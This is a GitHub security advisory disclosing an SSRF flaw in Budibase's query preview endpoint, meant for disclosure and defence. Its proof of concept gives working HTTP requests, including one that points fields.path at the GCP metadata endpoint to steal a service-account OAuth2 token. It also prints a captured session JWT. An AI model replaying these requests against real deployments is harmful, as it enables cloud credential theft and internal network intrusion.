# [H] Budibase Unrestricted Server-Side Request Forgery (SSRF) via REST Datasource Query Preview

## Summary
Severity: High
Advisory: GHSA-4647-wpjq-hh7f
CVE: CVE-2026-33226
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-4647-wpjq-hh7f
Type: github-advisory

## Affected
- npm: `budibase` — affected >=0

## Details
### Summary
The REST datasource query preview endpoint (`POST /api/queries/preview`) makes server-side HTTP requests to any URL supplied by the user in `fields.path` with no validation. An authenticated admin can reach internal services that are not exposed to the internet — including cloud metadata endpoints (AWS/GCP/Azure), internal databases, Kubernetes APIs, and other pods on the internal network. On GCP this leads to OAuth2 token theft with `cloud-platform` scope (full GCP access). On any deployment it enables full internal network enumeration.

### Details

The vulnerable handler is in `packages/server/src/api/controllers/query.ts` (`preview()`). It reads `fields.path` from the request body and passes it directly to the REST HTTP client without any IP or hostname validation:

```
fields.path  →  RestClient.read({ path })  →  node-fetch(path)
```

No blocklist exists for:
- Loopback (`127.0.0.1`, `::1`)
- RFC 1918 ranges (`10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`)
- Link-local / cloud metadata (`169.254.x.x`)
- Internal Kubernetes DNS (`.svc.cluster.local`)

The `datasourceId` field must reference an existing REST-type datasource. This is trivially obtained via `GET /api/datasources` (lists all datasources with their IDs) or created on-demand with a single POST — no base URL is required and `fields.path` overrides it entirely.

### PoC

**Step 1 — Get session token**
```http
POST /api/global/auth/default/login HTTP/1.1
Host: budibase.dev.com
Content-Type: application/json

{"username": "admin@example.com", "password": "password"}
```
Response sets `Cookie: budibase:auth=<JWT>`.

**Step 2 — Get a REST datasourceId**
```http
GET /api/datasources HTTP/1.1
Host: budibase.dev.com
Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19kY2EyMDk0NDdjMGQ0YjI2YjkxNWVmNGRhYTNjMTUzMCIsInNlc3Npb25JZCI6ImVkNTZlNDRiYjg3ODQyNDU5MmJlZmZlMWFjNmY3OTkzIiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJ0ZXN0X2FkbWluX3VzZXJAdGVzdHRlc3QxMjMuY29tIiwiaWF0IjoxNzcxOTMxNjQ2fQ.O7hCEO8z95dW64hilJ_W80JU0AJqdCC_ZlAPRPlKLVs
x-budibase-app-id: app_dev_3dbfeba315fd4baa8fb6202fe517e93b
```
Pick any `_id` where `"source": "REST"`.

Captured from this engagement:
- Token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19kY2EyMDk0NDdjMGQ0YjI2YjkxNWVmNGRhYTNjMTUzMCIsInNlc3Npb25JZCI6ImVkNTZlNDRiYjg3ODQyNDU5MmJlZmZlMWFjNmY3OTkzIiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJ0ZXN0X2FkbWluX3VzZXJAdGVzdHRlc3QxMjMuY29tIiwiaWF0IjoxNzcxOTMxNjQ2fQ.O7hCEO8z95dW64hilJ_W80JU0AJqdCC_ZlAPRPlKLVs`
- App ID: `app_dev_3dbfeba315fd4baa8fb6202fe517e93b`
- REST datasource ID: `datasource_49d5a1ed1c6149e48c4de0923e5b20c5`

**Step 3 — Send SSRF request**

Change `fields.path` to any internal URL. Examples below.

**3a. Cloud metadata — GCP OAuth2 token**
```http
POST /api/queries/preview HTTP/1.1
Host: budibase.dev.com
Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19kY2EyMDk0NDdjMGQ0YjI2YjkxNWVmNGRhYTNjMTUzMCIsInNlc3Npb25JZCI6ImVkNTZlNDRiYjg3ODQyNDU5MmJlZmZlMWFjNmY3OTkzIiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJ0ZXN0X2FkbWluX3VzZXJAdGVzdHRlc3QxMjMuY29tIiwiaWF0IjoxNzcxOTMxNjQ2fQ.O7hCEO8z95dW64hilJ_W80JU0AJqdCC_ZlAPRPlKLVs
x-budibase-app-id: app_dev_3dbfeba315fd4baa8fb6202fe517e93b
Content-Type: application/json

{
  "datasourceId": "datasource_49d5a1ed1c6149e48c4de0923e5b20c5",
  "name": "ssrf", "parameters": [], "transformer": "return data", "queryVerb": "read",
  "fields": {
    "path": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
    "headers": {"Metadata-Flavor": "Google"},
    "queryString": "", "requestBody": ""
  },
  "schema": {}
}
```
Response:
```json
{"access_token": "ya29.d.c0AZ4bNpYDUK...", "expires_in": 3598, "token_type": "Bearer"}
```
### Impact
_What kind of vulnerability is it? Who is impacted?_
Any authenticated admin/builder user can make the Budibase server issue HTTP requests to any network-reachable address. Confirmed impact on this engagement:

- **Cloud credential theft** — GCP OAuth2 token with `cloud-platform` scope stolen from `169.254.169.254`. Token verified valid against GCP Projects API, granting full access to all GCP services in the project.
- **Internal database access** — CouchDB reached at `budibase-svc-couchdb:5984` with extracted credentials, exposing all application data.
- **Internal service enumeration** — MinIO (`minio-service:9000`), Redis, and internal worker APIs (`127.0.0.1:4002`) all reachable.
- **Kubernetes cluster access** — K8s API server reachable at `kubernetes.default.svc` using the pod's mounted service account token.

The vulnerability affects **all deployment environments** (GCP, AWS, Azure, bare-metal, Docker Compose, Kubernetes). The specific impact depends on what services are reachable from the Budibase pod, but cloud metadata theft is possible on any cloud-hosted instance.




Detected by:
Abdulrahman Albatel
Abdullah Alrasheed

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-4647-wpjq-hh7f
- https://nvd.nist.gov/vuln/detail/CVE-2026-33226
- https://github.com/Budibase/budibase
